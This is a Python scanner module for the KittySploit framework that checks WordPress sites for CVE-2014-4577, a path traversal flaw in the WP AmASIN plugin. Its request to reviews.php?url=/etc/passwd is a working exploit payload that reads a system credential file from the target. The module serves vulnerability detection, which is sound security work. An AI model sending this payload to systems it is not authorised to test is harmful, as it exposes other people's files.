#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Absolute path traversal vulnerability in reviews."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP AmASIN – The Amazon Affiliate Shop - Local File Inclusion Detection',
        'description': 'Absolute path traversal vulnerability in reviews.php in the WP AmASIN - The Amazon Affiliate Shop plugin 0.9.6 and earlier for WordPress allows remote attackers to read arbitrary files via a full pathname in the url parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'wordpress', 'wpscan', 'wp-plugin', 'lfi', 'wp', 'wp-amasin-the-amazon-affiliate-shop', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://codevigilant.com/disclosure/wp-plugin-wp-amasin-the-amazon-affiliate-shop-local-file-inclusion/',
            'https://wpscan.com/plugin/wp-amasin-the-amazon-affiliate-shop/',
            'https://github.com/superlink996/chunqiuyunjingbachang',
        ],
        'cve': 'CVE-2014-4577',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/wp-amasin-the-amazon-affiliate-shop/',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/wp-amasin-the-amazon-affiliate-shop/reviews.php?url=/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='medium', reason='WP AmASIN – The Amazon Affiliate Shop - Local File Inclusion detected', path=path)
            return True
        return False

